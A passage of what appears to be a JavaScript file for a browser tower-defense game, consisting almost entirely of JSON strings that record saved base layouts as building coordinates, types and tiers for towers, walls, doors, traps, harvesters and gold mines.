Wall\"},\"201922472\":{\"x\":-456,\"y\":792,\"type\":\"Door\"},\"201922473\":{\"x\":-408,\"y\":792,\"type\":\"Door\"},\"201922474\":{\"x\":-408,\"y\":744,\"type\":\"Door\"},\"201922475\":{\"x\":-360,\"y\":744,\"type\":\"Door\"},\"201922476\":{\"x\":-312,\"y\":744,\"type\":\"Door\"},\"201922477\":{\"x\":-312,\"y\":696,\"type\":\"Door\"},\"201922478\":{\"x\":-264,\"y\":696,\"type\":\"Door\"},\"201922479\":{\"x\":-216,\"y\":696,\"type\":\"Door\"},\"201922480\":{\"x\":-216,\"y\":648,\"type\":\"Door\"},\"201922481\":{\"x\":-168,\"y\":648,\"type\":\"Door\"},\"201922482\":{\"x\":-120,\"y\":600,\"type\":\"SlowTrap\"},\"201922483\":{\"x\":168,\"y\":648,\"type\":\"Door\"},\"201922484\":{\"x\":216,\"y\":648,\"type\":\"Door\"},\"201922485\":{\"x\":216,\"y\":696,\"type\":\"Door\"},\"201922486\":{\"x\":264,\"y\":696,\"type\":\"Door\"},\"201922487\":{\"x\":312,\"y\":696,\"type\":\"Door\"},\"201922488\":{\"x\":312,\"y\":744,\"type\":\"Door\"},\"201922489\":{\"x\":360,\"y\":744,\"type\":\"Wall\"},\"201922490\":{\"x\":408,\"y\":744,\"type\":\"Wall\"},\"201922491\":{\"x\":408,\"y\":792,\"type\":\"Wall\"},\"201922492\":{\"x\":360,\"y\":792,\"type\":\"Wall\"},\"201922493\":{\"x\":456,\"y\":744,\"type\":\"Wall\"},\"201922494\":{\"x\":456,\"y\":696,\"type\":\"Wall\"},\"201922495\":{\"x\":504,\"y\":696,\"type\":\"Wall\"},\"201922496\":{\"x\":552,\"y\":648,\"type\":\"Wall\"},\"201922497\":{\"x\":288,\"y\":144,\"type\":\"ArrowTower\"},\"201922498\":{\"x\":384,\"y\":192,\"type\":\"ArrowTower\"},\"201922499\":{\"x\":384,\"y\":288,\"type\":\"ArrowTower\"},\"201922500\":{\"x\":480,\"y\":336,\"type\":\"ArrowTower\"},\"201922501\":{\"x\":480,\"y\":240,\"type\":\"CannonTower\"},\"201922502\":{\"x\":576,\"y\":288,\"type\":\"CannonTower\"},\"201922503\":{\"x\":672,\"y\":336,\"type\":\"MagicTower\"},\"201922504\":{\"x\":576,\"y\":384,\"type\":\"MagicTower\"},\"201922505\":{\"x\":672,\"y\":528,\"type\":\"MagicTower\"},\"201922506\":{\"x\":576,\"y\":576,\"type\":\"MagicTower\"},\"201922507\":{\"x\":672,\"y\":432,\"type\":\"ArrowTower\"},\"201922508\":{\"x\":576,\"y\":480,\"type\":\"ArrowTower\"},\"201922509\":{\"x\":-24,\"y\":552,\"type\":\"Wall\"},\"201922510\":{\"x\":24,\"y\":552,\"type\":\"SlowTrap\"},\"201922511\":{\"x\":0,\"y\":480,\"type\":\"Harvester\"},\"201922512\":{\"x\":0,\"y\":384,\"type\":\"Harvester\"},\"201922513\":{\"x\":0,\"y\":288,\"type\":\"Harvester\"},\"201922514\":{\"x\":-24,\"y\":72,\"type\":\"SlowTrap\"},\"201922515\":{\"x\":-24,\"y\":120,\"type\":\"SlowTrap\"},\"201922516\":{\"x\":-24,\"y\":168,\"type\":\"SlowTrap\"},\"201922517\":{\"x\":-24,\"y\":216,\"type\":\"SlowTrap\"},\"201922518\":{\"x\":24,\"y\":216,\"type\":\"SlowTrap\"},\"201922519\":{\"x\":24,\"y\":168,\"type\":\"SlowTrap\"},\"201922520\":{\"x\":24,\"y\":120,\"type\":\"SlowTrap\"},\"201922521\":{\"x\":24,\"y\":72,\"type\":\"SlowTrap\"},\"201922633\":{\"x\":96,\"y\":528,\"type\":\"MagicTower\"},\"201922668\":{\"x\":192,\"y\":576,\"type\":\"MagicTower\"},\"201922798\":{\"x\":-96,\"y\":528,\"type\":\"MagicTower\"},\"201923027\":{\"x\":-480,\"y\":624,\"type\":\"CannonTower\"},\"201923039\":{\"x\":-480,\"y\":528,\"type\":\"CannonTower\"},\"201923062\":{\"x\":-480,\"y\":432,\"type\":\"CannonTower\"},\"201923156\":{\"x\":-480,\"y\":336,\"type\":\"ArrowTower\"},\"201923170\":{\"x\":-576,\"y\":384,\"type\":\"ArrowTower\"},\"201923200\":{\"x\":-576,\"y\":480,\"type\":\"ArrowTower\"},\"201923374\":{\"x\":96,\"y\":432,\"type\":\"CannonTower\"},\"201923403\":{\"x\":192,\"y\":480,\"type\":\"CannonTower\"},\"201923608\":{\"x\":288,\"y\":528,\"type\":\"CannonTower\"},\"201923619\":{\"x\":288,\"y\":624,\"type\":\"CannonTower\"},\"201923693\":{\"x\":384,\"y\":672,\"type\":\"CannonTower\"},\"201923749\":{\"x\":384,\"y\":576,\"type\":\"CannonTower\"},\"201923797\":{\"x\":480,\"y\":624,\"type\":\"CannonTower\"},\"201923837\":{\"x\":96,\"y\":336,\"type\":\"CannonTower\"},\"201923853\":{\"x\":192,\"y\":384,\"type\":\"CannonTower\"},\"201923854\":{\"x\":288,\"y\":432,\"type\":\"CannonTower\"},\"201923855\":{\"x\":384,\"y\":480,\"type\":\"CannonTower\"},\"201923856\":{\"x\":480,\"y\":528,\"type\":\"CannonTower\"},\"201923858\":{\"x\":-96,\"y\":432,\"type\":\"CannonTower\"},\"201923859\":{\"x\":-192,\"y\":480,\"type\":\"CannonTower\"},\"201923860\":{\"x\":-192,\"y\":576,\"type\":\"CannonTower\"},\"201923861\":{\"x\":480,\"y\":432,\"type\":\"BombTower\"},\"201923862\":{\"x\":384,\"y\":384,\"type\":\"BombTower\"},\"201923863\":{\"x\":288,\"y\":336,\"type\":\"BombTower\"},\"201923864\":{\"x\":192,\"y\":288,\"type\":\"BombTower\"},\"201923865\":{\"x\":96,\"y\":240,\"type\":\"BombTower\"},\"201923866\":{\"x\":96,\"y\":144,\"type\":\"BombTower\"},\"201923867\":{\"x\":288,\"y\":240,\"type\":\"BombTower\"},\"201923868\":{\"x\":-96,\"y\":144,\"type\":\"BombTower\"},\"201923869\":{\"x\":-192,\"y\":192,\"type\":\"BombTower\"},\"201923870\":{\"x\":-288,\"y\":240,\"type\":\"BombTower\"},\"201923871\":{\"x\":-384,\"y\":288,\"type\":\"BombTower\"},\"201923872\":{\"x\":-384,\"y\":384,\"type\":\"BombTower\"},\"201923873\":{\"x\":-288,\"y\":336,\"type\":\"BombTower\"},\"201923874\":{\"x\":-192,\"y\":288,\"type\":\"BombTower\"},\"201923875\":{\"x\":-96,\"y\":240,\"type\":\"BombTower\"},\"201923876\":{\"x\":-96,\"y\":336,\"type\":\"BombTower\"},\"201923877\":{\"x\":-192,\"y\":384,\"type\":\"BombTower\"},\"201923878\":{\"x\":-288,\"y\":432,\"type\":\"BombTower\"},\"201923879\":{\"x\":-384,\"y\":480,\"type\":\"BombTower\"},\"201923880\":{\"x\":-288,\"y\":528,\"type\":\"BombTower\"},\"201923881\":{\"x\":-384,\"y\":576,\"type\":\"BombTower\"},\"201923882\":{\"x\":-384,\"y\":672,\"type\":\"BombTower\"},\"201923883\":{\"x\":-288,\"y\":624,\"type\":\"BombTower\"},\"201923884\":{\"x\":192,\"y\":192,\"type\":\"BombTower\"}}";
let scoreBase4PT80MRight = "{\"201923886\":{\"x\":48,\"y\":-96,\"type\":\"ArrowTower\"},\"201923887\":{\"x\":96,\"y\":-192,\"type\":\"ArrowTower\"},\"201923888\":{\"x\":48,\"y\":96,\"type\":\"ArrowTower\"},\"201923889\":{\"x\":96,\"y\":192,\"type\":\"ArrowTower\"},\"201923927\":{\"x\":0,\"y\":-192,\"type\":\"Harvester\"},\"201923998\":{\"x\":-96,\"y\":-96,\"type\":\"Harvester\"},\"201924046\":{\"x\":-144,\"y\":0,\"type\":\"Harvester\"},\"201924109\":{\"x\":-96,\"y\":96,\"type\":\"Harvester\"},\"201925736\":{\"x\":144,\"y\":-288,\"type\":\"ArrowTower\"},\"201925780\":{\"x\":96,\"y\":-384,\"type\":\"ArrowTower\"},\"201925803\":{\"x\":192,\"y\":-384,\"type\":\"ArrowTower\"},\"201925872\":{\"x\":144,\"y\":-480,\"type\":\"CannonTower\"},\"201925908\":{\"x\":240,\"y\":-480,\"type\":\"CannonTower\"},\"201925931\":{\"x\":288,\"y\":-576,\"type\":\"CannonTower\"},\"201925953\":{\"x\":192,\"y\":-576,\"type\":\"CannonTower\"},\"201926015\":{\"x\":240,\"y\":-672,\"type\":\"MagicTower\"},\"201926054\":{\"x\":384,\"y\":-768,\"type\":\"MagicTower\"},\"201926067\":{\"x\":288,\"y\":-768,\"type\":\"MagicTower\"},\"201926068\":{\"x\":336,\"y\":-672,\"type\":\"MagicTower\"},\"201926069\":{\"x\":456,\"y\":-744,\"type\":\"Wall\"},\"201926070\":{\"x\":504,\"y\":-744,\"type\":\"Wall\"},\"201926071\":{\"x\":432,\"y\":-672,\"type\":\"MagicTower\"},\"201926072\":{\"x\":528,\"y\":-672,\"type\":\"MagicTower\"},\"201926073\":{\"x\":576,\"y\":-576,\"type\":\"MagicTower\"},\"201926074\":{\"x\":672,\"y\":-576,\"type\":\"MagicTower\"},\"201926075\":{\"x\":720,\"y\":-480,\"type\":\"MagicTower\"},\"201926076\":{\"x\":600,\"y\":-648,\"type\":\"Wall\"},\"201926077\":{\"x\":648,\"y\":-648,\"type\":\"Wall\"},\"201926078\":{\"x\":744,\"y\":-552,\"type\":\"Wall\"},\"201926079\":{\"x\":792,\"y\":-456,\"type\":\"Door\"},\"201926080\":{\"x\":792,\"y\":-408,\"type\":\"Door\"},\"201926081\":{\"x\":744,\"y\":-408,\"type\":\"Door\"},\"201926082\":{\"x\":744,\"y\":-360,\"type\":\"Door\"},\"201926083\":{\"x\":744,\"y\":-312,\"type\":\"Door\"},\"201926084\":{\"x\":696,\"y\":-312,\"type\":\"Door\"},\"201926085\":{\"x\":696,\"y\":-264,\"type\":\"Door\"},\"201926086\":{\"x\":696,\"y\":-216,\"type\":\"Door\"},\"201926087\":{\"x\":648,\"y\":-216,\"type\":\"Door\"},\"201926088\":{\"x\":648,\"y\":-168,\"type\":\"Door\"},\"201926089\":{\"x\":600,\"y\":-120,\"type\":\"SlowTrap\"},\"201926091\":{\"x\":648,\"y\":168,\"type\":\"Door\"},\"201926092\":{\"x\":648,\"y\":216,\"type\":\"Door\"},\"201926093\":{\"x\":696,\"y\":216,\"type\":\"Door\"},\"201926094\":{\"x\":696,\"y\":264,\"type\":\"Door\"},\"201926095\":{\"x\":744,\"y\":312,\"type\":\"Door\"},\"201926096\":{\"x\":696,\"y\":312,\"type\":\"Door\"},\"201926097\":{\"x\":744,\"y\":360,\"type\":\"Wall\"},\"201926098\":{\"x\":792,\"y\":360,\"type\":\"Wall\"},\"201926099\":{\"x\":792,\"y\":408,\"type\":\"Wall\"},\"201926100\":{\"x\":744,\"y\":408,\"type\":\"Wall\"},\"201926101\":{\"x\":744,\"y\":456,\"type\":\"Wall\"},\"201926102\":{\"x\":696,\"y\":456,\"type\":\"Wall\"},\"201926103\":{\"x\":696,\"y\":504,\"type\":\"Wall\"},\"201926104\":{\"x\":648,\"y\":552,\"type\":\"Wall\"},\"201926106\":{\"x\":528,\"y\":-96,\"type\":\"MagicTower\"},\"201926107\":{\"x\":576,\"y\":-192,\"type\":\"CannonTower\"},\"201926108\":{\"x\":480,\"y\":-192,\"type\":\"CannonTower\"},\"201926109\":{\"x\":432,\"y\":-96,\"type\":\"CannonTower\"},\"201926111\":{\"x\":480,\"y\":-576,\"type\":\"ArrowTower\"},\"201926112\":{\"x\":384,\"y\":-576,\"type\":\"ArrowTower\"},\"201926113\":{\"x\":336,\"y\":-480,\"type\":\"ArrowTower\"},\"201926114\":{\"x\":624,\"y\":-480,\"type\":\"CannonTower\"},\"201926115\":{\"x\":528,\"y\":-480,\"type\":\"CannonTower\"},\"201926116\":{\"x\":432,\"y\":-480,\"type\":\"CannonTower\"},\"201926117\":{\"x\":144,\"y\":-96,\"type\":\"BombTower\"},\"201926119\":{\"x\":384,\"y\":-192,\"type\":\"BombTower\"},\"201926120\":{\"x\":288,\"y\":-192,\"type\":\"BombTower\"},\"201926121\":{\"x\":192,\"y\":-192,\"type\":\"BombTower\"},\"201926122\":{\"x\":240,\"y\":-96,\"type\":\"BombTower\"},\"201926123\":{\"x\":336,\"y\":-96,\"type\":\"BombTower\"},\"201926124\":{\"x\":240,\"y\":-288,\"type\":\"BombTower\"},\"201926125\":{\"x\":336,\"y\":-288,\"type\":\"BombTower\"},\"201926126\":{\"x\":432,\"y\":-288,\"type\":\"BombTower\"},\"201926127\":{\"x\":528,\"y\":-288,\"type\":\"BombTower\"},\"201926128\":{\"x\":624,\"y\":-288,\"type\":\"BombTower\"},\"201926129\":{\"x\":672,\"y\":-384,\"type\":\"BombTower\"},\"201926130\":{\"x\":576,\"y\":-384,\"type\":\"BombTower\"},\"201926132\":{\"x\":288,\"y\":-384,\"type\":\"BombTower\"},\"201926133\":{\"x\":384,\"y\":-384,\"type\":\"BombTower\"},\"201926134\":{\"x\":480,\"y\":-384,\"type\":\"BombTower\"},\"201926135\":{\"x\":552,\"y\":-24,\"type\":\"Wall\"},\"201926136\":{\"x\":552,\"y\":24,\"type\":\"SlowTrap\"},\"201926137\":{\"x\":480,\"y\":0,\"type\":\"Harvester\"},\"201926138\":{\"x\":384,\"y\":0,\"type\":\"Harvester\"},\"201926139\":{\"x\":288,\"y\":0,\"type\":\"Harvester\"},\"201926140\":{\"x\":120,\"y\":-24,\"type\":\"SlowTrap\"},\"201926141\":{\"x\":168,\"y\":-24,\"type\":\"SlowTrap\"},\"201926142\":{\"x\":216,\"y\":-24,\"type\":\"SlowTrap\"},\"201926143\":{\"x\":72,\"y\":-24,\"type\":\"SlowTrap\"},\"201926144\":{\"x\":72,\"y\":24,\"type\":\"SlowTrap\"},\"201926145\":{\"x\":120,\"y\":24,\"type\":\"SlowTrap\"},\"201926146\":{\"x\":168,\"y\":24,\"type\":\"SlowTrap\"},\"201926147\":{\"x\":216,\"y\":24,\"type\":\"SlowTrap\"},\"201926148\":{\"x\":528,\"y\":96,\"type\":\"MagicTower\"},\"201926149\":{\"x\":576,\"y\":192,\"type\":\"MagicTower\"},\"201926155\":{\"x\":432,\"y\":96,\"type\":\"CannonTower\"},\"201926156\":{\"x\":480,\"y\":192,\"type\":\"CannonTower\"},\"201926157\":{\"x\":672,\"y\":384,\"type\":\"CannonTower\"},\"201926159\":{\"x\":336,\"y\":96,\"type\":\"CannonTower\"},\"201926161\":{\"x\":384,\"y\":192,\"type\":\"CannonTower\"},\"201926162\":{\"x\":624,\"y\":288,\"type\":\"CannonTower\"},\"201926163\":{\"x\":528,\"y\":288,\"type\":\"CannonTower\"},\"201926164\":{\"x\":432,\"y\":288,\"type\":\"CannonTower\"},\"201926165\":{\"x\":576,\"y\":384,\"type\":\"CannonTower\"},\"201926166\":{\"x\":480,\"y\":384,\"type\":\"CannonTower\"},\"201926168\":{\"x\":624,\"y\":480,\"type\":\"CannonTower\"},\"201926169\":{\"x\":528,\"y\":480,\"type\":\"CannonTower\"},\"201926766\":{\"x\":576,\"y\":576,\"type\":\"MagicTower\"},\"201927359\":{\"x\":528,\"y\":672,\"type\":\"MagicTower\"},\"201927498\":{\"x\":384,\"y\":576,\"type\":\"MagicTower\"},\"201927610\":{\"x\":336,\"y\":672,\"type\":\"MagicTower\"},\"201928136\":{\"x\":288,\"y\":576,\"type\":\"CannonTower\"},\"201928195\":{\"x\":480,\"y\":576,\"type\":\"ArrowTower\"},\"201928254\":{\"x\":432,\"y\":672,\"type\":\"ArrowTower\"},\"201928704\":{\"x\":240,\"y\":480,\"type\":\"CannonTower\"},\"201928807\":{\"x\":336,\"y\":480,\"type\":\"ArrowTower\"},\"201929252\":{\"x\":288,\"y\":384,\"type\":\"ArrowTower\"},\"201929327\":{\"x\":192,\"y\":384,\"type\":\"ArrowTower\"},\"201929416\":{\"x\":144,\"y\":288,\"type\":\"ArrowTower\"},\"201929418\":{\"x\":144,\"y\":96,\"type\":\"BombTower\"},\"201929419\":{\"x\":240,\"y\":96,\"type\":\"BombTower\"},\"201929421\":{\"x\":0,\"y\":192,\"type\":\"Harvester\"},\"201929422\":{\"x\":192,\"y\":192,\"type\":\"BombTower\"},\"201929423\":{\"x\":288,\"y\":192,\"type\":\"BombTower\"},\"201929424\":{\"x\":336,\"y\":288,\"type\":\"BombTower\"},\"201929425\":{\"x\":240,\"y\":288,\"type\":\"BombTower\"},\"201929426\":{\"x\":384,\"y\":384,\"type\":\"BombTower\"},\"201929427\":{\"x\":432,\"y\":480,\"type\":\"BombTower\"}}";
let goldBase = "{\"56563382\":{\"x\":96,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"56563384\":{\"x\":0,\"y\":144,\"type\":\"Harvester\",\"tier\":1},\"56563385\":{\"x\":0,\"y\":240,\"type\":\"Harvester\",\"tier\":1},\"56563386\":{\"x\":-48,\"y\":-240,\"type\":\"ArrowTower\",\"tier\":1},\"56563387\":{\"x\":-48,\"y\":-336,\"type\":\"ArrowTower\",\"tier\":1},\"56563388\":{\"x\":-144,\"y\":-288,\"type\":\"ArrowTower\",\"tier\":1},\"56563389\":{\"x\":-144,\"y\":-384,\"type\":\"ArrowTower\",\"tier\":1},\"56563390\":{\"x\":96,\"y\":-288,\"type\":\"ArrowTower\",\"tier\":1},\"56563391\":{\"x\":96,\"y\":-384,\"type\":\"ArrowTower\",\"tier\":1},\"56563392\":{\"x\":192,\"y\":-384,\"type\":\"ArrowTower\",\"tier\":1},\"56563393\":{\"x\":192,\"y\":-288,\"type\":\"ArrowTower\",\"tier\":1},\"56563394\":{\"x\":288,\"y\":-336,\"type\":\"ArrowTower\",\"tier\":1},\"56563395\":{\"x\":-240,\"y\":-96,\"type\":\"ArrowTower\",\"tier\":1},\"56563396\":{\"x\":-288,\"y\":-192,\"type\":\"ArrowTower\",\"tier\":1},\"56563397\":{\"x\":-384,\"y\":-192,\"type\":\"ArrowTower\",\"tier\":1},\"56563398\":{\"x\":-336,\"y\":-96,\"type\":\"ArrowTower\",\"tier\":1},\"56563399\":{\"x\":-288,\"y\":48,\"type\":\"ArrowTower\",\"tier\":1},\"56563400\":{\"x\":-384,\"y\":48,\"type\":\"ArrowTower\",\"tier\":1},\"56563401\":{\"x\":-384,\"y\":144,\"type\":\"ArrowTower\",\"tier\":1},\"56563402\":{\"x\":-288,\"y\":144,\"type\":\"ArrowTower\",\"tier\":1},\"56563403\":{\"x\":-336,\"y\":240,\"type\":\"ArrowTower\",\"tier\":1},\"56563463\":{\"x\":-480,\"y\":-192,\"type\":\"MagicTower\",\"tier\":1},\"56563510\":{\"x\":-528,\"y\":-96,\"type\":\"MagicTower\",\"tier\":1},\"56563555\":{\"x\":-432,\"y\":-96,\"type\":\"MagicTower\",\"tier\":1},\"56563623\":{\"x\":-480,\"y\":48,\"type\":\"MagicTower\",\"tier\":1},\"56563689\":{\"x\":-480,\"y\":144,\"type\":\"MagicTower\",\"tier\":1},\"56564135\":{\"x\":-432,\"y\":240,\"type\":\"CannonTower\",\"tier\":1},\"56564194\":{\"x\":-528,\"y\":240,\"type\":\"CannonTower\",\"tier\":1},\"56564245\":{\"x\":-528,\"y\":336,\"type\":\"CannonTower\",\"tier\":1},\"56564934\":{\"x\":-528,\"y\":432,\"type\":\"CannonTower\",\"tier\":1},\"56565078\":{\"x\":-96,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"56565149\":{\"x\":-48,\"y\":-432,\"type\":\"MagicTower\",\"tier\":1},\"56565175\":{\"x\":-48,\"y\":-528,\"type\":\"MagicTower\",\"tier\":1},\"56565190\":{\"x\":-144,\"y\":-480,\"type\":\"MagicTower\",\"tier\":1},\"56565195\":{\"x\":96,\"y\":-480,\"type\":\"MagicTower\",\"tier\":1},\"56565196\":{\"x\":192,\"y\":-480,\"type\":\"MagicTower\",\"tier\":1},\"56565197\":{\"x\":288,\"y\":-432,\"type\":\"CannonTower\",\"tier\":1},\"56565199\":{\"x\":288,\"y\":-528,\"type\":\"CannonTower\",\"tier\":1},\"56565201\":{\"x\":384,\"y\":-528,\"type\":\"CannonTower\",\"tier\":1},\"56565202\":{\"x\":480,\"y\":-528,\"type\":\"CannonTower\",\"tier\":1},\"56565204\":{\"x\":-240,\"y\":-576,\"type\":\"MagicTower\",\"tier\":1},\"56565205\":{\"x\":-336,\"y\":-576,\"type\":\"MagicTower\",\"tier\":1},\"56565207\":{\"x\":-432,\"y\":-480,\"type\":\"MagicTower\",\"tier\":1},\"56565208\":{\"x\":-528,\"y\":-384,\"type\":\"CannonTower\",\"tier\":1},\"56565209\":{\"x\":-432,\"y\":-384,\"type\":\"CannonTower\",\"tier\":1},\"56565210\":{\"x\":-480,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"56565213\":{\"x\":-384,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"56578879\":{\"x\":-336,\"y\":-480,\"type\":\"CannonTower\",\"tier\":1},\"56578880\":{\"x\":-240,\"y\":-480,\"type\":\"CannonTower\",\"tier\":1},\"56578881\":{\"x\":-240,\"y\":-384,\"type\":\"CannonTower\",\"tier\":1},\"56578882\":{\"x\":-240,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"56578883\":{\"x\":384,\"y\":-432,\"type\":\"BombTower\",\"tier\":1},\"56578884\":{\"x\":480,\"y\":-432,\"type\":\"BombTower\",\"tier\":1},\"56578885\":{\"x\":480,\"y\":-336,\"type\":\"GoldMine\",\"tier\":1},\"56578886\":{\"x\":384,\"y\":-336,\"type\":\"GoldMine\",\"tier\":1},\"56578887\":{\"x\":384,\"y\":-240,\"type\":\"GoldMine\",\"tier\":1},\"56578889\":{\"x\":288,\"y\":-240,\"type\":\"BombTower\",\"tier\":1},\"56578890\":{\"x\":336,\"y\":-144,\"type\":\"BombTower\",\"tier\":1},\"56578891\":{\"x\":480,\"y\":-240,\"type\":\"BombTower\",\"tier\":1},\"56578892\":{\"x\":576,\"y\":-336,\"type\":\"BombTower\",\"tier\":1},\"56578893\":{\"x\":576,\"y\":-432,\"type\":\"MeleeTower\",\"tier\":1},\"56578894\":{\"x\":672,\"y\":-336,\"type\":\"MeleeTower\",\"tier\":1},\"56578895\":{\"x\":576,\"y\":-240,\"type\":\"MeleeTower\",\"tier\":1},\"56578896\":{\"x\":384,\"y\":-624,\"type\":\"MagicTower\",\"tier\":1},\"56578897\":{\"x\":456,\"y\":-600,\"type\":\"Wall\",\"tier\":1},\"56578898\":{\"x\":456,\"y\":-648,\"type\":\"Door\",\"tier\":1},\"56578899\":{\"x\":504,\"y\":-600,\"type\":\"Door\",\"tier\":1},\"56578900\":{\"x\":408,\"y\":-696,\"type\":\"Door\",\"tier\":1},\"56578901\":{\"x\":360,\"y\":-696,\"type\":\"SlowTrap\",\"tier\":1},\"56578902\":{\"x\":312,\"y\":-648,\"type\":\"SlowTrap\",\"tier\":1},\"56578903\":{\"x\":312,\"y\":-600,\"type\":\"Door\",\"tier\":1},\"56578904\":{\"x\":264,\"y\":-600,\"type\":\"SlowTrap\",\"tier\":1},\"56578905\":{\"x\":72,\"y\":-600,\"type\":\"Door\",\"tier\":1},\"56578906\":{\"x\":72,\"y\":-552,\"type\":\"Door\",\"tier\":1},\"56578907\":{\"x\":-24,\"y\":-600,\"type\":\"Door\",\"tier\":1},\"56578908\":{\"x\":216,\"y\":-600,\"type\":\"SlowTrap\",\"tier\":1},\"56578909\":{\"x\":168,\"y\":-600,\"type\":\"SlowTrap\",\"tier\":1},\"56578910\":{\"x\":120,\"y\":-600,\"type\":\"SlowTrap\",\"tier\":1},\"56578911\":{\"x\":120,\"y\":-552,\"type\":\"SlowTrap\",\"tier\":1},\"56578912\":{\"x\":168,\"y\":-552,\"type\":\"SlowTrap\",\"tier\":1},\"56578913\":{\"x\":216,\"y\":-552,\"type\":\"SlowTrap\",\"tier\":1},\"56578914\":{\"x\":552,\"y\":-504,\"type\":\"Wall\",\"tier\":1},\"56578915\":{\"x\":552,\"y\":-552,\"type\":\"Door\",\"tier\":1},\"56578916\":{\"x\":600,\"y\":-504,\"type\":\"Door\",\"tier\":1},\"56578917\":{\"x\":648,\"y\":-408,\"type\":\"Wall\",\"tier\":1},\"56578918\":{\"x\":648,\"y\":-456,\"type\":\"Door\",\"tier\":1},\"56578919\":{\"x\":696,\"y\":-408,\"type\":\"Door\",\"tier\":1},\"56578920\":{\"x\":744,\"y\":-360,\"type\":\"Door\",\"tier\":1},\"56578921\":{\"x\":744,\"y\":-312,\"type\":\"Door\",\"tier\":1},\"56578922\":{\"x\":648,\"y\":-264,\"type\":\"Wall\",\"tier\":1},\"56578923\":{\"x\":696,\"y\":-264,\"type\":\"Door\",\"tier\":1},\"56578924\":{\"x\":648,\"y\":-216,\"type\":\"Door\",\"tier\":1},\"56578925\":{\"x\":648,\"y\":-168,\"type\":\"SlowTrap\",\"tier\":1},\"56578926\":{\"x\":600,\"y\":-168,\"type\":\"SlowTrap\",\"tier\":1},\"56578927\":{\"x\":600,\"y\":-120,\"type\":\"SlowTrap\",\"tier\":1},\"56578928\":{\"x\":648,\"y\":-120,\"type\":\"SlowTrap\",\"tier\":1},\"56578930\":{\"x\":648,\"y\":-72,\"type\":\"SlowTrap\",\"tier\":1},\"56578931\":{\"x\":576,\"y\":-48,\"type\":\"MagicTower\",\"tier\":1},\"56578933\":{\"x\":480,\"y\":-48,\"type\":\"MagicTower\",\"tier\":1},\"56578934\":{\"x\":576,\"y\":96,\"type\":\"MagicTower\",\"tier\":1},\"56578968\":{\"x\":528,\"y\":192,\"type\":\"MagicTower\",\"tier\":1},\"56579003\":{\"x\":480,\"y\":96,\"type\":\"CannonTower\",\"tier\":1},\"56579825\":{\"x\":384,\"y\":96,\"type\":\"CannonTower\",\"tier\":1},\"56579940\":{\"x\":432,\"y\":192,\"type\":\"CannonTower\",\"tier\":1},\"56580107\":{\"x\":528,\"y\":-144,\"type\":\"CannonTower\",\"tier\":1},\"56580212\":{\"x\":432,\"y\":-144,\"type\":\"CannonTower\",\"tier\":1},\"56580370\":{\"x\":384,\"y\":-48,\"type\":\"CannonTower\",\"tier\":1},\"56581054\":{\"x\":288,\"y\":-48,\"type\":\"ArrowTower\",\"tier\":1},\"56581247\":{\"x\":288,\"y\":96,\"type\":\"ArrowTower\",\"tier\":1},\"56582237\":{\"x\":336,\"y\":192,\"type\":\"BombTower\",\"tier\":1},\"56582340\":{\"x\":384,\"y\":288,\"type\":\"BombTower\",\"tier\":1},\"56582456\":{\"x\":480,\"y\":288,\"type\":\"BombTower\",\"tier\":1},\"56583142\":{\"x\":576,\"y\":288,\"type\":\"MeleeTower\",\"tier\":1},\"56583929\":{\"x\":648,\"y\":-24,\"type\":\"Door\",\"tier\":1},\"56584056\":{\"x\":648,\"y\":72,\"type\":\"Door\",\"tier\":1},\"56584134\":{\"x\":648,\"y\":120,\"type\":\"SlowTrap\",\"tier\":1},\"56584186\":{\"x\":648,\"y\":168,\"type\":\"SlowTrap\",\"tier\":1},\"56584192\":{\"x\":648,\"y\":216,\"type\":\"SlowTrap\",\"tier\":1},\"56584230\":{\"x\":600,\"y\":216,\"type\":\"SlowTrap\",\"tier\":1},\"56584259\":{\"x\":600,\"y\":168,\"type\":\"SlowTrap\",\"tier\":1},\"56584623\":{\"x\":648,\"y\":264,\"type\":\"Door\",\"tier\":1},\"56584636\":{\"x\":648,\"y\":312,\"type\":\"Wall\",\"tier\":1},\"56584651\":{\"x\":696,\"y\":312,\"type\":\"Door\",\"tier\":1},\"56584658\":{\"x\":744,\"y\":360,\"type\":\"Door\",\"tier\":1},\"56584659\":{\"x\":744,\"y\":408,\"type\":\"Door\",\"tier\":1},\"56584660\":{\"x\":696,\"y\":456,\"type\":\"Door\",\"tier\":1},\"56584661\":{\"x\":648,\"y\":504,\"type\":\"Door\",\"tier\":1},\"56584662\":{\"x\":600,\"y\":552,\"type\":\"Door\",\"tier\":1},\"56584663\":{\"x\":552,\"y\":600,\"type\":\"Door\",\"tier\":1},\"56584664\":{\"x\":552,\"y\":552,\"type\":\"Wall\",\"tier\":1},\"56584667\":{\"x\":504,\"y\":648,\"type\":\"Door\",\"tier\":1},\"56584668\":{\"x\":456,\"y\":696,\"type\":\"Door\",\"tier\":1},\"56584669\":{\"x\":408,\"y\":744,\"type\":\"Door\",\"tier\":1},\"56584670\":{\"x\":360,\"y\":792,\"type\":\"Door\",\"tier\":1},\"56584671\":{\"x\":312,\"y\":792,\"type\":\"Door\",\"tier\":1},\"56584672\":{\"x\":264,\"y\":744,\"type\":\"Door\",\"tier\":1},\"56584673\":{\"x\":216,\"y\":696,\"type\":\"Door\",\"tier\":1},\"56584674\":{\"x\":168,\"y\":648,\"type\":\"Door\",\"tier\":1},\"56584675\":{\"x\":120,\"y\":648,\"type\":\"Door\",\"tier\":1},\"56584676\":{\"x\":72,\"y\":696,\"type\":\"SlowTrap\",\"tier\":1},\"56584677\":{\"x\":24,\"y\":696,\"type\":\"Door\",\"tier\":1},\"56584678\":{\"x\":-120,\"y\":696,\"type\":\"SlowTrap\",\"tier\":1},\"56584679\":{\"x\":-72,\"y\":696,\"type\":\"Door\",\"tier\":1},\"56584680\":{\"x\":-24,\"y\":648,\"type\":\"SlowTrap\",\"tier\":1},\"56584681\":{\"x\":-96,\"y\":528,\"type\":\"CannonTower\",\"tier\":1},\"56584682\":{\"x\":-96,\"y\":624,\"type\":\"MagicTower\",\"tier\":1},\"56584683\":{\"x\":48,\"y\":528,\"type\":\"MagicTower\",\"tier\":1},\"56584684\":{\"x\":48,\"y\":624,\"type\":\"MagicTower\",\"tier\":1},\"56584685\":{\"x\":144,\"y\":576,\"type\":\"MagicTower\",\"tier\":1},\"56584686\":{\"x\":144,\"y\":480,\"type\":\"CannonTower\",\"tier\":1},\